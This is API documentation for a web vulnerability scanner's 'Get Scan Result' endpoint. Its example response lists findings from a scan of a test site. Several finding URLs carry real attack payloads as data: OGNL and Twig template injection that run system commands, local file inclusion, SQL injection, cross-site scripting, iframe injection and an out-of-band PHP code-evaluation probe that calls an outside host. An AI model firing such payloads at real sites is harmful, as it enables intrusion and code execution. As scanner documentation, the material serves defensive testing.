# Get Scan Result

**Description**: Gets the result of a scan.

## Endpoint

- **URL:** `/api/1.0/scans/result/{{id}}`
- **Method:** `get`
## Inputs

- **path_parameters** (object) – Required
  - **id** (string) – Required
## Output

### Example

```json
[
  {
    "status_code": 200,
    "response_headers": {
      "Date": "Thu, 28 Mar 2024 09:51:24 GMT",
      "Content-Type": "application/json; charset=utf-8",
      "Content-Length": "15091",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache",
      "Pragma": "no-cache",
      "Expires": "-1",
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "Referrer-Policy": "no-referrer",
      "X-XSS-Protection": "1; mode=block",
      "Origin-Trial": "Au1hLO38HdoU0c5ahko3BUGr8p9Kt881bvrcCP4vESne1HV+B1XX/MZhfZNP/TWW4+BPBlKO9h3fokvWCxZdsQAAAABieyJvcmlnaW4iOiJodHRwczovL3d3dy5uZXRzcGFya2VyY2xvdWQuY29tOjQ0MyIsImZlYXR1cmUiOiJVMkZTZWN1cml0eUtleUFQSSIsImV4cGlyeSI6MTY1ODg3OTk5OX0=",
      "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
      "Expect-CT": "max-age=30,report-uri=\"https://www.netsparkercloud.com/report-ct/\""
    },
    "reason": "OK",
    "json_body": [
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/8c9d907144a841cf4b9bb11d048c9e8f/",
        "Title": "Out-of-date Version (Apache)",
        "Type": "ApacheOutOfDate",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/fa7ab20a1b93421a4ba0b11d048c9ee2/",
        "Title": "Version Disclosure (Apache)",
        "Type": "ApacheVersionDisclosure",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/11636cfb2fe040194ba5b11d048c9f2a/",
        "Title": "Out-of-date Version (PHP)",
        "Type": "PhpOutOfDate",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/f5038a59466e4efb4babb11d048c9f76/",
        "Title": "Version Disclosure (PHP)",
        "Type": "PhpVersionDisclosure",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/26cd924e39cd45534bb0b11d048c9fc3/",
        "Title": "Apache Web Server Identified",
        "Type": "ApacheIdentified",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/ee6c0ee8ec47414b4bb5b11d048ca006/",
        "Title": "PHP Identified",
        "Type": "PHPIdentified",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/9a73573d828e41a54bbab11d048ca04d/",
        "Title": "Windows Server Identified",
        "Type": "WindowsServerIdentified",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/8a7d1d08ae0149d34bbfb11d048ca0d3/",
        "Title": "Missing X-Content-Type-Options Header",
        "Type": "MissingXContentTypeOptionsHeader",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/3de7353367ee43a24bc4b11d048ca122/",
        "Title": "Content Security Policy (CSP) Not Implemented",
        "Type": "CspNotImplemented",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/075e764ba7bd41af4bc9b11d048ca173/",
        "Title": "Referrer-Policy Not Implemented",
        "Type": "ReferrerPolicyNotImplemented",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/3f66a2977371484d4bf3b11d048ca632/",
        "Title": "Open Policy Crossdomain.xml Detected",
        "Type": "OpenCrossDomainXml",
        "Url": "http://php.testinvicti.com/crossdomain.xml"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/552938aa65cd4c1f4beeb11d048ca5e3/",
        "Title": "SSL/TLS Not Implemented",
        "Type": "SslNotImplemented",
        "Url": "https://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/102067d290d44a874bfcb11d048caa00/",
        "Title": "Open Silverlight Client Access Policy",
        "Type": "OpenClientAccessPolicy",
        "Url": "http://php.testinvicti.com/clientaccesspolicy.xml"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/1bede62fa4aa464b4c01b11d048caf03/",
        "Title": "Robots.txt Detected",
        "Type": "RobotsIdentified",
        "Url": "http://php.testinvicti.com/robots.txt"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/bef917203e0347de4c07b11d048cb1d4/",
        "Title": "Apache MultiViews Enabled",
        "Type": "ApacheMultiViewsEnabled",
        "Url": "http://php.testinvicti.com/crossdomain"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/6cd34d1f84ea446a4a4db11d048c334e/",
        "Title": "Cookie Not Marked as HttpOnly",
        "Type": "CookieNotMarkedAsHttpOnly",
        "Url": "http://php.testinvicti.com/auth/control.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/44c38a7a71cf4a9e4a52b11d048c33ab/",
        "Title": "SameSite Cookie Not Implemented",
        "Type": "SameSiteCookieNotImplemented",
        "Url": "http://php.testinvicti.com/auth/control.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/1ce30310224640794c82b11d048cb792/",
        "Title": "Forbidden Resource",
        "Type": "ForbiddenResource",
        "Url": "http://php.testinvicti.com/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=expr%20268409241%20-%2031572"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/010a813b0cc64f1c4e6fb11d048cd5f1/",
        "Title": "TRACE/TRACK Method Detected",
        "Type": "TraceTrackIdentified",
        "Url": "http://php.testinvicti.com/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/2f7203298ca548624e74b11d048cd661/",
        "Title": "SVN Detected",
        "Type": "SvnDisclosure",
        "Url": "http://php.testinvicti.com/.svn/all-wcprops"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/e046f5cbaa44469b4e88b11d048ce40d/",
        "Title": "Email Address Disclosure",
        "Type": "EmailDisclosure",
        "Url": "http://php.testinvicti.com/process.php@r87.com"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/1b940f32d2c34c405191b11d048cf2cb/",
        "Title": "Programming Error Message",
        "Type": "ProgrammingErrorMessages",
        "Url": "http://php.testinvicti.com/hello.php?name=Visitor"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/b248cc9534824f725196b11d048cf319/",
        "Title": "[Possible] Internal Path Disclosure (Windows)",
        "Type": "PossibleInternalWindowsPathLeakage",
        "Url": "http://php.testinvicti.com/hello.php?name=Visitor"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/5a5e3874dea541054e90b11d048ce71b/",
        "Title": "Insecure Frame (External)",
        "Type": "InsecureFrameExternal",
        "Url": "http://php.testinvicti.com/process.php?file=Generics/contact.nsp"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/909d67fbe488453a5205b11d048d0b28/",
        "Title": "[Possible] Cross-site Request Forgery",
        "Type": "CsrfDetected",
        "Url": "http://php.testinvicti.com/nslookup.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/c629df845dca4bb67dc0b11d04984676/",
        "Title": "Autocomplete is Enabled",
        "Type": "AutoCompleteEnabled",
        "Url": "http://php.testinvicti.com/auth/login.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/e86abc0f146c4d877dc5b11d049846d2/",
        "Title": "Autocomplete Enabled (Password Field)",
        "Type": "AutoCompleteEnabledPasswordField",
        "Url": "http://php.testinvicti.com/auth/login.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/c2549da60b6241137dcab11d049847a9/",
        "Title": "Password Transmitted over HTTP",
        "Type": "PasswordOverHttp",
        "Url": "http://php.testinvicti.com/auth/login.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/07e8899297984763f3a7b13b0449a969/",
        "Title": "[Possible] Login Page Identified",
        "Type": "LoginPageIdentified",
        "Url": "http://php.testinvicti.com/auth/login.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/51072e38294447715339b11d048d70b0/",
        "Title": "Local File Inclusion",
        "Type": "Lfi",
        "Url": "http://php.testinvicti.com/process.php?file=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00.nsp"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/750bf38888ab4232523eb11d048d152b/",
        "Title": "[Possible] Internal IP Address Disclosure",
        "Type": "InternalIPLeakage",
        "Url": "http://php.testinvicti.com/nslookup.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/307ee5ede2d54b0d5272b11d048d2c38/",
        "Title": "Directory Listing (Apache)",
        "Type": "ApacheDirectoryListing",
        "Url": "http://php.testinvicti.com/auth/images/?C=N;O=D"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/143f96cfcba74add5239b11d048d14c8/",
        "Title": "phpinfo() Output Detected",
        "Type": "PhpInfoIdentified",
        "Url": "http://php.testinvicti.com/phpinfo.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/638b110f9c464cda5244b11d048d15c0/",
        "Title": "[Possible] Windows Username Disclosure",
        "Type": "WinUsernameDisclosure",
        "Url": "http://php.testinvicti.com/phpinfo.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/a63e1edbaa664bc95249b11d048d162a/",
        "Title": "PHP session.use_only_cookies Is Disabled",
        "Type": "PhpUseOnlyCookiesIsDisabled",
        "Url": "http://php.testinvicti.com/phpinfo.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/a4e3d0bfcbef4b72554ab11d048e1c70/",
        "Title": "Subresource Integrity (SRI) Not Implemented",
        "Type": "SubResourceIntegrityNotImplemented",
        "Url": "http://php.testinvicti.com/products.php?pro=hTTp%3a%2f%2fr87.com%2fn"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/2370429c7c5b4422566fb11d048eaa2e/",
        "Title": "Code Execution via SSTI (PHP Twig)",
        "Type": "CodeExecutionViaSstiTwig",
        "Url": "http://php.testinvicti.com/artist.php?id=%7b%7b_self.env.registerUndefinedFilterCallback(%22system%22)%7d%7d%7b%7b_self.env.getFilter(%22SET%20%2fA%20268409241%20-%2032921%22)%7d%7d"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/a57908b826744d935668b11d048ea8aa/",
        "Title": "Internal Server Error",
        "Type": "InternalServerError",
        "Url": "http://php.testinvicti.com/artist.php?id=%25%7b%23context%5b%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%5d.addHeader(%22a%22%2c268409241-58270)%7d"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/83ebde9780ac42205739b11d048eeb2a/",
        "Title": "[Possible] Internal Path Disclosure (*nix)",
        "Type": "PossibleInternalUnixPathLeakage",
        "Url": "http://php.testinvicti.com/phpinfo.php?hTTp://r87.com/n"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/de4785ed58004bb45741b11d048eee20/",
        "Title": "phpinfo() Output Detected",
        "Type": "PhpInfoIdentified",
        "Url": "http://php.testinvicti.com/phpinfo.php/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=expr%20268409241%20-%2064767"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/5af2259910594d43575bb11d048ef503/",
        "Title": "phpinfo() Output Detected",
        "Type": "PhpInfoIdentified",
        "Url": "http://php.testinvicti.com/phpinfo.php/etc/passwd"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/7ef89e9ea3cb41d1574bb11d048ef1c5/",
        "Title": "phpinfo() Output Detected",
        "Type": "PhpInfoIdentified",
        "Url": "http://php.testinvicti.com/phpinfo.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/ef460308e44e46756185b11d048ffb85/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/artist.php?id=%3cscRipt%3enetsparker(0x00096A)%3c%2fscRipt%3e"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/0314517d94464837612db11d048fe1af/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/products.php?pro='%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x00037C)%3C/scRipt%3E"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/e1e88f7352bc4f1962ecb11d04906d18/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/products.php?pp=x%22%20onmouseover%3dnetsparker(0x000E4E)%20x%3d%22"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/24ca9403cdc84ae764d7b11d04912918/",
        "Title": "Frame Injection",
        "Type": "FrameInjection",
        "Url": "http://php.testinvicti.com/artist.php?id=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/54f2c23936b8472261ffb11d049020ee/",
        "Title": "OPTIONS Method Enabled",
        "Type": "OptionsMethodEnabled",
        "Url": "http://php.testinvicti.com/Generics/"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/2e2437c378ac42966466b11d0490f41f/",
        "Title": "Database User Has Admin Privileges",
        "Type": "DbConnectedAsAdmin",
        "Url": "http://php.testinvicti.com/artist.php?id=-1%20OR%2017-7%3d10"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/76151767fbd44ad8646bb11d0490f463/",
        "Title": "Database Detected (MySQL)",
        "Type": "MySqlIdentified",
        "Url": "http://php.testinvicti.com/artist.php?id=-1%20OR%201%3d1))%20AND%20IFNULL(ASCII(SUBSTRING((SELECT%200x4E4554535041524B4552)%2c9%2c1))%2c0)%3d82--%20"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/620e6d88b4d94bf86310b11d04907cb0/",
        "Title": "Command Injection",
        "Type": "CommandInjection",
        "Url": "http://php.testinvicti.com/nslookup.php"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/eba316dac2ff4ebe65aeb11d0491685d/",
        "Title": "[Possible] Insecure Reflected Content",
        "Type": "InsecureReflectedContent",
        "Url": "http://php.testinvicti.com/hello.php?hpp=Netsparker&irc=N3tSp4rK3R&pp=%20DAST"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/6fd355993ab842286998b11d04921dba/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/hello.php?hpp=%3cscRipt%3enetsparker(0x0018AD)%3c%2fscRipt%3e&irc=&pp=%20DAST"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/7b2c9c11aa7142d77087b11d04937458/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/hello.php?aaaa%2f=Invicti!&hpp=%3cscRipt%3enetsparker(0x0018AF)%3c%2fscRipt%3e&pp=%20DAST"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/7be756acced9471471c8b11d0493bc89/",
        "Title": "Frame Injection",
        "Type": "FrameInjection",
        "Url": "http://php.testinvicti.com/hello.php?hpp=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e&irc=&pp=%20DAST"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/b0593767c0234fda666eb11d0491b4dc/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/hello.php?hpp=Netsparker&irc=&pp=%3cscRipt%3enetsparker(0x0018C1)%3c%2fscRipt%3e"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/67a14c5a8ab84a4371afb11d0493b339/",
        "Title": "Frame Injection",
        "Type": "FrameInjection",
        "Url": "http://php.testinvicti.com/hello.php?aaaa%2f=Invicti!&hpp=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e&pp=%20DAST"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/9b4963301d00479e6f76b11d04933105/",
        "Title": "Cross-site Scripting",
        "Type": "Xss",
        "Url": "http://php.testinvicti.com/hello.php?aaaa%2f=Invicti!&hpp=Invicti&pp=%3cscRipt%3enetsparker(0x0018EC)%3c%2fscRipt%3e"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/eb65b23d4f824a0a6fefb11d0493515f/",
        "Title": "Frame Injection",
        "Type": "FrameInjection",
        "Url": "http://php.testinvicti.com/hello.php?aaaa%2f=Invicti!&hpp=Invicti&pp=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/057579b3c99f4b6f6cdab11d0492b56a/",
        "Title": "Frame Injection",
        "Type": "FrameInjection",
        "Url": "http://php.testinvicti.com/hello.php?hpp=Netsparker&irc=&pp=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/f7f1be2ee2404716b87cb11d04a72273/",
        "Title": "Boolean Based SQL Injection",
        "Type": "ConfirmedBooleanSqlInjection",
        "Url": "http://php.testinvicti.com/artist.php?id=-1%20OR%2017-7%3d10"
      },
      {
        "IssueUrl": "https://www.netsparkercloud.com/issues/detail/727346361c0e44e7b881b11d04a722fa/",
        "Title": "Out of Band Code Evaluation (PHP)",
        "Type": "OutOfBandRcePhp",
        "Url": "http://php.testinvicti.com/hello.php?name=%2bgethostbyname(trim(%27lvqqunnh6nyjfabnzzv4qbbe2reraccqjy3r1ls4%27.%27afg.r87.me%27))%3b%2f%2f"
      }
    ]
  }
]
```
### Output Parameters

- **status_code** (number)
- **reason** (string)
- **json_body** (array)
  - **IssueUrl** (string)
  - **Title** (string)
  - **Type** (string)
  - **Url** (string)
## Response Headers

| Header | Type |
|--------|------|
| Date | string |
| Content-Type | string |
| Content-Length | string |
| Connection | string |
| Cache-Control | string |
| Pragma | string |
| Expires | string |
| X-Content-Type-Options | string |
| X-Frame-Options | string |
| Referrer-Policy | string |
| X-XSS-Protection | string |
| Origin-Trial | string |
| Strict-Transport-Security | string |
| Expect-CT | string |